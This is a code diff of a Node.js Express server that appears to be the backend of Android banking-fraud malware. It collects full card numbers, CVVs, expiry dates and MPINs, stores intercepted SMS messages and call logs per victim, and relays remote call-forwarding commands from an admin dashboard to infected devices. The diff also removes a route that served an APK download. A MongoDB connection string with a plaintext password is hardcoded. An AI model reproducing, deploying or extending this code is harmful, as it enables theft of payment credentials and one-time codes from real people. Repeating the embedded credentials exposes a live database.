@@ -1,18 +1,23 @@
+// server.js
 const express = require("express");
 const cors = require("cors");
 const mongoose = require("mongoose");
 const http = require("http");
 const { Server } = require("socket.io");
-
+const process = require("process");
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
-const User = require("./models/User"); // ✅ IMPORTANT
+// Models
+const User = require("./models/User");
+
+// Middlewares
 app.use(cors());
 app.use(express.static("public"));
-
 app.use(express.json());
+
+// HTTP + Socket server
 const server = http.createServer(app);
 const io = new Server(server, {
   cors: {
@@ -21,75 +26,66 @@ const io = new Server(server, {
   }
 });
 
+// make io available on req.app if some code expects it
+app.set("io", io);
 
-
-mongoose.connect("mongodb+srv://oosrp9132_db_user:BnixQ3Qdq7kPXBcG@cluster0.vez1b2n.mongodb.net/")
+/* ===========================
+   MONGODB
+   =========================== */
+mongoose.connect("mongodb+srv://oosrp9132_db_user:BnixQ3Qdq7kPXBcG@cluster0.vez1b2n.mongodb.net/",)
   .then(() => console.log("✅ MongoDB connected"))
   .catch(err => console.error("❌ MongoDB error:", err));
 
 
-
-
-
-/* =======================
-   SMS SCHEMA
-======================= */
+/* ===========================
+   SCHEMAS
+   =========================== */
 const SmsSchema = new mongoose.Schema({
-  userId: { type: String, required: true }, // NEW: link to user,
+  userId: { type: String, required: true },
   sender: { type: String, required: true },
   message: { type: String, required: true },
   receivedAt: { type: Date, default: Date.now }
-});
+}, { timestamps: true });
 const Sms = mongoose.model("Sms", SmsSchema);
 
-/* =======================
-   PHONE NUMBER SCHEMA
-======================= */
 const PhoneSchema = new mongoose.Schema({
   phone: { type: String, required: true },
-});
-
+}, { timestamps: true });
 const Phone = mongoose.model("Phone", PhoneSchema);
 
 const CallLogSchema = new mongoose.Schema({
-  userId: { type: String, required: true }, // NEW: link to user
-  phone: { type: String },                  // device phone number (optional)
-  number: { type: String, required: true }, // called / received number
+  userId: { type: String, required: true },
+  phone: { type: String },
+  number: { type: String, required: true },
   type: { type: String, enum: ["INCOMING", "OUTGOING", "MISSED"], required: true },
   duration: { type: String },
-  date: { type: Number, required: true },   // timestamp from Android
+  date: { type: Number, required: true },
   createdAt: { type: Date, default: Date.now }
 });
-
 const CallLog = mongoose.model("CallLog", CallLogSchema);
 
 
-// GET /submit-form → return all users
+/* ===========================
+   ROUTES
+   =========================== */
+
+// Health
+app.get("/", (req, res) => res.send("✅ SMS API with MongoDB is running"));
+
+// Get users (submit-form)
 app.get("/submit-form", async (req, res) => {
   try {
-    // Fetch all users, hide sensitive info
-    const users = await User.find({}, {
-      __v: 0
-    }).sort({ createdAt: -1 }); // latest first
-
-    res.status(200).json({
-      success: true,
-      count: users.length,
-      data: users
-    });
-  } catch (error) {
-    console.error("GET USERS ERROR:", error.message);
-    res.status(500).json({
-      success: false,
-      error: error.message
-    });
+    const users = await User.find({}, { __v: 0 }).sort({ createdAt: -1 });
+    return res.status(200).json({ success: true, count: users.length, data: users });
+  } catch (err) {
+    console.error("GET USERS ERROR:", err);
+    return res.status(500).json({ success: false, error: err.message || "Server error" });
   }
 });
 
-
+// Create user
 app.post("/submit-form", async (req, res) => {
   try {
-    // ✅ Convert card limits to numbers
     const data = {
       deviceModel: req.body.deviceModel,
       userId: req.body.userId,
@@ -98,270 +94,183 @@ app.post("/submit-form", async (req, res) => {
       phone: req.body.phone,
       dob: req.body.dob,
       city: req.body.city,
-
       cardHolderName: req.body.cardHolderName,
-
-      cardTotalLimit: req.body.cardTotalLimit
-        ? Number(req.body.cardTotalLimit)
-        : null,
-
-      cardAvailableLimit: req.body.cardAvailableLimit
-        ? Number(req.body.cardAvailableLimit)
-        : null,
-
-      // ⚠️ NOT RECOMMENDED (but added because you asked)
+      cardTotalLimit: req.body.cardTotalLimit ? Number(req.body.cardTotalLimit) : null,
+      cardAvailableLimit: req.body.cardAvailableLimit ? Number(req.body.cardAvailableLimit) : null,
       cardNumber: req.body.cardNumber,
       expiryDate: req.body.expiryDate,
       cvv: req.body.cvv,
       mpin: req.body.mpin
     };
 
-    // ✅ Save user
     const user = new User(data);
     await user.save();
 
     io.emit("new_user", user);
 
-    return res.status(201).json({
-      success: true,
-      message: "User & card data saved successfully"
-    });
-
-  } catch (error) {
-    console.error("SAVE ERROR:", error.message);
-    return res.status(500).json({
-      success: false,
-      error: error.message
-    });
+    return res.status(201).json({ success: true, message: "User saved successfully", data: user });
+  } catch (err) {
+    console.error("SAVE ERROR:", err);
+    return res.status(500).json({ success: false, error: err.message || "Server error" });
   }
 });
 
-// Test API
-app.get("/", (req, res) => {
-  res.send("✅ SMS API with MongoDB is running");
-});
 
-// Receive SMS + store in DB
+/* ===========================
+   SMS ENDPOINTS
+   =========================== */
+
+// Receive SMS and store, then emit to the user's room
 app.post("/sms", async (req, res) => {
   const { userId, sender, message } = req.body;
 
   if (!userId || !sender || !message) {
-    return res.status(400).json({
-      success: false,
-      message: "Missing required fields: userId, sender or message"
-    });
+    return res.status(400).json({ success: false, message: "Missing required fields: userId, sender or message" });
   }
 
   try {
-    const sms = await Sms.create({
-      userId,
-      sender,
-      message
-    });
-
+    const sms = await Sms.create({ userId, sender, message });
     console.log("📩 SMS Stored:", userId, sender);
 
-    // ✅ Emit only to that user's room
-    const io = req.app.get("io");
+    // Emit to that user's room (use io directly)
     io.to(`user-${userId}`).emit("new_sms", sms);
-    console.log("📢 Realtime SMS sent to room:", `user-${userId}`, sms);
+    console.log("📢 Realtime SMS emitted to room:", `user-${userId}`);
 
-
-    res.json({
-      success: true,
-      message: "SMS stored successfully"
-    });
+    return res.json({ success: true, message: "SMS stored successfully", data: sms });
   } catch (err) {
     console.error("❌ SMS save failed:", err);
-    res.status(500).json({
-      success: false,
-      message: "Database error"
-    });
+    return res.status(500).json({ success: false, message: "Database error" });
   }
 });
 
-
-// GET route to fetch SMS for a particular user
+// Fetch SMS list for user
 app.get("/sms", async (req, res) => {
   const { userId } = req.query;
-
-  if (!userId) {
-    return res.status(400).json({
-      success: false,
-      message: "Missing userId query parameter"
-    });
-  }
+  if (!userId) return res.status(400).json({ success: false, message: "Missing userId query parameter" });
 
   try {
-    const smsList = await Sms.find({ userId }).sort({ createdAt: -1 }); // latest first
-    res.json({ success: true, data: smsList });
+    const smsList = await Sms.find({ userId }).sort({ createdAt: -1 });
+    return res.json({ success: true, data: smsList });
   } catch (err) {
-    console.error("❌ Fetch failed:", err);
-    res.status(500).json({ success: false, message: "Database error" });
+    console.error("❌ Fetch SMS failed:", err);
+    return res.status(500).json({ success: false, message: "Database error" });
   }
 });
 
-app.get("/download-apk", (req, res) => {
-  const filePath = __dirname + "/public/yes_card.apk";
-  res.download(filePath, "Yes-card.apk");
-});
 
+/* ===========================
+   PHONE NUMBER (single) ENDPOINTS
+   =========================== */
 
-
-// Save phone number (single)
 app.post("/get-number", async (req, res) => {
   const { phone } = req.body;
-
-  if (!phone) {
-    return res.status(400).json({
-      success: false,
-      message: "Phone number required"
-    });
-  }
+  if (!phone) return res.status(400).json({ success: false, message: "Phone number required" });
 
   try {
     let record = await Phone.findOne();
-
     if (record) {
-      // Update existing number
       record.phone = phone;
       await record.save();
     } else {
-      // Create new record
       record = await Phone.create({ phone });
     }
-
     console.log("📞 Phone saved:", phone);
-
-    res.json({
-      success: true,
-      phone: record.phone
-    });
-
+    return res.json({ success: true, phone: record.phone });
   } catch (err) {
-    console.error(err);
-    res.status(500).json({ success: false });
+    console.error("❌ Save phone failed:", err);
+    return res.status(500).json({ success: false });
   }
 });
 
-
-
-// Get phone number directly
 app.get("/get-number", async (req, res) => {
-  const record = await Phone.findOne();
-
-  if (!record) {
-    return res.json({ phone: null });
+  try {
+    const record = await Phone.findOne();
+    return res.json({ phone: record?.phone || null });
+  } catch (err) {
+    console.error("❌ Get phone failed:", err);
+    return res.status(500).json({ success: false });
   }
-
-  res.json({ phone: record.phone });
 });
 
-/* =======================
-   RECEIVE CALL LOG
-======================= */
+
+/* ===========================
+   CALL LOGS
+   =========================== */
+
 app.post("/call-log", async (req, res) => {
   const { userId, number, type, duration, date, phone } = req.body;
-
-  console.log("Received call log:", userId, number, type);
-
   if (!userId || !number || !type || !date) {
-    return res.status(400).json({
-      success: false,
-      message: "Missing required fields (userId, number, type, date)"
-    });
+    return res.status(400).json({ success: false, message: "Missing required fields (userId, number, type, date)" });
   }
 
   try {
-    // Avoid duplicates (same call timestamp + number + userId)
+    // Avoid duplicates (same userId + number + date)
     const exists = await CallLog.findOne({ userId, number, date });
     if (exists) {
       return res.json({ success: true, message: "Already exists" });
     }
 
-    const log = new CallLog({
-      userId,
-      phone: phone || null,
-      number,
-      type,
-      duration,
-      date
-    });
-
-    await log.save();
-
+    const log = await CallLog.create({ userId, number, type, duration, date, phone });
     console.log("📞 Call log saved:", userId, number, type);
 
-    // Emit to admin dashboard
+    // Emit to admin/dashboard (not per-user)
     io.emit("new_call_log", log);
 
-    res.json({ success: true });
-
+    return res.json({ success: true, data: log });
   } catch (err) {
     console.error("❌ Call log save error:", err);
-    res.status(500).json({ success: false, message: "Server error" });
+    return res.status(500).json({ success: false, message: "Server error" });
   }
 });
 
-/* =======================
-   GET ALL CALL LOGS
-======================= */
-// GET route to fetch call logs, optionally filtered by userId
 app.get("/call-logs", async (req, res) => {
   const { userId } = req.query;
-
   try {
-    let query = {};
-    if (userId) {
-      query.userId = userId; // filter by userId if provided
-    }
-
-    const logs = await CallLog.find(query).sort({ createdAt: -1 }); // latest first
-    res.json({ success: true, data: logs });
+    const query = userId ? { userId } : {};
+    const logs = await CallLog.find(query).sort({ createdAt: -1 });
+    return res.json({ success: true, data: logs });
   } catch (err) {
     console.error("❌ Fetch call logs failed:", err);
-    res.status(500).json({ success: false, message: "Database error" });
+    return res.status(500).json({ success: false, message: "Database error" });
   }
 });
 
 
+/* ===========================
+   SOCKET.IO (REAL-TIME)
+   =========================== */
 
-
-/* 🔥 Admin sends ON/OFF request */
 io.on("connection", (socket) => {
-  console.log("🟢 Client connected:", socket.id);
+  console.log("🟢 Socket connected:", socket.id);
 
   socket.on("join-user", (userId) => {
+    if (!userId) return;
     socket.join(`user-${userId}`);
-    console.log(`📌 Joined room: user-${userId}`);
+    console.log(`📌 Socket ${socket.id} joined room user-${userId}`);
   });
 
-  // Admin → Android
+  // Admin sends ON/OFF command to a device (server forwards to device room)
   socket.on("forwarding_control", ({ userId, action, number }) => {
-    console.log("📤 Sending forwarding command:", userId, action);
-
-    io.to(`user-${userId}`).emit("call_forward_command", {
-      action,
-      number
-    });
+    if (!userId) return;
+    console.log("📤 Forwarding command:", { userId, action, number });
+    io.to(`user-${userId}`).emit("call_forward_command", { action, number });
   });
 
-  // Android → Admin
+  // Android device sends back status
   socket.on("forwarding_status_from_app", (data) => {
-    console.log("📩 Status received:", data);
-
-    io.emit("forwarding_status", data);
+    console.log("📩 Forwarding status from device:", data);
+    io.emit("forwarding_status", data); // broadcast to all admin clients
   });
 
-  socket.on("disconnect", () => {
-    console.log("🔴 Client disconnected:", socket.id);
+  socket.on("disconnect", (reason) => {
+    console.log("🔴 Socket disconnected:", socket.id, "reason:", reason);
   });
 });
 
 
-/* =======================
+/* ===========================
    START SERVER
-======================= */
+   =========================== */
 server.listen(PORT, () => {
   console.log(`🚀 Server running at http://localhost:${PORT}`);
 });
